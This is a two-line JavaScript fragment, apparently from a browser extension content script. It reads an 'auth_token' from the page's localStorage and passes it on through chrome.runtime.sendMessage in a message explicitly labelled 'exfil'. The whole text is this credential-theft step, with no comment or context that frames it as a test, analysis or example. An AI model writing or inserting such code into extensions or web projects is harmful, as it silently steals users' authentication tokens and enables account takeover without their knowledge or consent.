var token = localStorage.getItem("auth_token");
chrome.runtime.sendMessage({ type: "exfil", token: token });
